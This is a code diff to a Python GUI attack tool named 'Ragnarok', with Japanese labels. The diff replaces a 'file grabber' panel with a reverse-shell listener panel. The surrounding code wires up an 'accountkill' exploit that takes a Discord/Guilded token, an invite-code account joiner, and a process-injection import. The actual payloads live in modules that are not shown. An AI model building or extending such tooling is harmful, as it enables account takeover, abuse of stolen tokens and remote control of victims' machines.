@@ -1,14 +1,15 @@
 import asyncio
-import os
-
-import dearpygui.dearpygui as dpg
-from pyinjector import inject
-import ipget
-import requests
 import re
 import threading
-import servertool
+
+import dearpygui.dearpygui as dpg
+import requests
+from pyinjector import inject
+
 import cbg
+import cpuplots
+import ipget
+import servertool
 from guildedjoiner import Exploit
 
 
@@ -70,10 +71,13 @@ def accountkill():
     exploit = Exploit(dpg.get_value("token"))
     exploit.execute()
 
+
 def accountjoinner():
     asyncio.run(cbg.joiner(dpg.get_value("ic")))
 
 
+def start_RS():
+    cpuplots.start_server("127.0.0.1", dpg.get_value("portnum"))
 
 
 dpg.create_context()
@@ -114,13 +118,9 @@ with dpg.window(label="discord joiner", collapsed=False, no_close=True):
     dpg.add_input_text(label="招待コード", tag="ic")
     dpg.add_button(label="実行", callback=accountjoinner)
 
-with dpg.window(label="file grabber", collapsed=False, no_close=True):
-    dpg.add_input_text(label="ホスト名", tag="host")
+with dpg.window(label="リバースシェル", collapsed=False, no_close=True):
     dpg.add_input_int(label="ポート", tag="portnum")
-    with dpg.child_window():
-        dpg.add_text("操作盤")
-        dpg.add_checkbox(label="サーバーON/OFF", tag="toggle")
-        dpg.add_listbox(label="ファイル一覧", items=os.listdir(os.getcwd()))
+    dpg.add_button(label="待ち受け開始", callback=start_RS)
 
 dpg.create_viewport(title=f"Ragnarok", width=640, height=480)
 dpg.setup_dearpygui()
